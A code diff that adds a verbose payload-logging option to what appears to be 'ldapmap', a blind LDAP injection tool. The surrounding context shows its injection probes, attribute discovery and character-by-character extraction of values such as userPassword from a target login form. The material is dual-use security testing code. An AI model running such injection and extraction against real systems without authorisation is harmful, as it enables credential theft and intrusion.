@@ -22,6 +22,10 @@ Usage examples:
     # Route traffic through Burp Suite for debugging
     python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" \
         -p pass --proxy http://127.0.0.1:8080
+
+    # Enable verbose mode to log every outgoing payload
+    python ldapmap.py -u http://target/login -d "user=admin&pass=INJECT_HERE" \
+        -p pass --verbose
 """
 
 import argparse
@@ -104,10 +108,14 @@ def send_request(
     session: requests.Session,
     url: str,
     data: dict,
+    verbose: bool = False,
     use_json: bool = False,
 ) -> requests.Response | None:
     """
     Send a POST request and return the response.
+
+    When *verbose* is True, each outgoing payload is printed to stdout before
+    the request is dispatched.
 
     When *use_json* is True the payload is sent as a JSON body
     (``Content-Type: application/json``); otherwise it is sent as
@@ -115,6 +123,11 @@ def send_request(
 
     Returns None on connection errors so callers can handle failures gracefully.
     """
+    if verbose:
+        if use_json:
+            print(f"[V] POST {url}  json={json.dumps(data)}")
+        else:
+            print(f"[V] POST {url}  data={urlencode(data)}")
     try:
         post_kwargs = {"json": data} if use_json else {"data": data}
         resp = session.post(url, **post_kwargs, timeout=TIMEOUT)
@@ -168,6 +181,7 @@ def get_baseline(
     session: requests.Session,
     url: str,
     base_data: dict,
+    verbose: bool = False,
     use_json: bool = False,
 ) -> tuple[int, int]:
     """
@@ -175,7 +189,7 @@ def get_baseline(
 
     This baseline is used to detect deviations caused by injected payloads.
     """
-    resp = send_request(session, url, base_data, use_json)
+    resp = send_request(session, url, base_data, verbose, use_json)
     if resp is None:
         print("[!] Could not reach target for baseline request. Aborting.", file=sys.stderr)
         sys.exit(1)
@@ -210,6 +224,7 @@ def calibrate(
     param: str,
     true_status: int,
     true_length: int,
+    verbose: bool = False,
     use_json: bool = False,
 ) -> tuple[int, int]:
     """
@@ -223,7 +238,7 @@ def calibrate(
     Returns the (status, length) pair that represents a TRUE response.
     """
     wildcard_data = build_payload_data(base_data, param, "*", use_json)
-    resp = send_request(session, url, wildcard_data, use_json)
+    resp = send_request(session, url, wildcard_data, verbose, use_json)
     if resp is None:
         return true_status, true_length
 
@@ -254,6 +269,7 @@ def detect_injection(
     param: str,
     true_status: int,
     true_length: int,
+    verbose: bool = False,
     use_json: bool = False,
 ) -> bool:
     """
@@ -269,7 +285,7 @@ def detect_injection(
 
     for payload in DETECTION_PAYLOADS:
         data = build_payload_data(base_data, param, payload, use_json)
-        resp = send_request(session, url, data, use_json)
+        resp = send_request(session, url, data, verbose, use_json)
         if resp is None:
             continue
         length = len(resp.content)
@@ -289,7 +305,7 @@ def detect_injection(
     print("\n[*] AND/OR logic probes:")
     for label, payload in LOGIC_PAYLOADS.items():
         data = build_payload_data(base_data, param, payload, use_json)
-        resp = send_request(session, url, data, use_json)
+        resp = send_request(session, url, data, verbose, use_json)
         if resp is None:
             continue
         looks_true = is_true_response(resp, true_status, true_length)
@@ -315,6 +331,7 @@ def discover_attributes(
     param: str,
     true_status: int,
     true_length: int,
+    verbose: bool = False,
     use_json: bool = False,
 ) -> list[str]:
     """
@@ -331,7 +348,7 @@ def discover_attributes(
     for attr in COMMON_ATTRIBUTES:
         payload = f")({attr}=*)"
         data = build_payload_data(base_data, param, payload, use_json)
-        resp = send_request(session, url, data, use_json)
+        resp = send_request(session, url, data, verbose, use_json)
         if resp is None:
             continue
         if is_true_response(resp, true_status, true_length):
@@ -356,6 +373,7 @@ def extract_attribute(
     attribute: str,
     true_status: int,
     true_length: int,
+    verbose: bool = False,
     use_json: bool = False,
 ) -> str:
     """
@@ -382,7 +400,7 @@ def extract_attribute(
             # Build blind payload: )(attr=<prefix><char>*)
             payload = f")({attribute}={extracted}{char}*)"
             data = build_payload_data(base_data, param, payload, use_json)
-            resp = send_request(session, url, data, use_json)
+            resp = send_request(session, url, data, verbose, use_json)
             if resp is None:
                 continue
             if is_true_response(resp, true_status, true_length):
@@ -456,6 +474,12 @@ def parse_args() -> argparse.Namespace:
             "(e.g., userPassword). If omitted, attribute discovery is run."
         ),
     )
+    parser.add_argument(
+        "-v", "--verbose",
+        action="store_true",
+        default=False,
+        help="Print every outgoing POST payload to stdout.",
+    )
     return parser.parse_args()
 
 
@@ -499,20 +523,22 @@ def main() -> None:
     print(f"[*] Mode    : {'JSON body' if use_json else 'form data'}")
     if args.proxy:
         print(f"[*] Proxy   : {args.proxy}")
+    if args.verbose:
+        print("[*] Verbose : enabled")
 
     session = build_session(args.proxy)
 
     # 1. Baseline
-    true_status, true_length = get_baseline(session, args.url, base_data, use_json)
+    true_status, true_length = get_baseline(session, args.url, base_data, args.verbose, use_json)
 
     # 2. Calibrate TRUE fingerprint
     true_status, true_length = calibrate(
-        session, args.url, base_data, args.param, true_status, true_length, use_json
+        session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json
     )
 
     # 3. Detection
     vulnerable = detect_injection(
-        session, args.url, base_data, args.param, true_status, true_length, use_json
+        session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json
     )
 
     if not vulnerable:
@@ -527,7 +553,7 @@ def main() -> None:
     if args.extract:
         value = extract_attribute(
             session, args.url, base_data, args.param,
-            args.extract, true_status, true_length, use_json,
+            args.extract, true_status, true_length, args.verbose, use_json,
         )
         if value:
             print(f"\n[+] Extracted {args.extract} = {value}")
@@ -535,7 +561,7 @@ def main() -> None:
             print(f"\n[-] Could not extract value for attribute '{args.extract}'.")
     else:
         attrs = discover_attributes(
-            session, args.url, base_data, args.param, true_status, true_length, use_json
+            session, args.url, base_data, args.param, true_status, true_length, args.verbose, use_json
         )
         if attrs:
             print(f"\n[+] Discovered attributes: {', '.join(attrs)}")
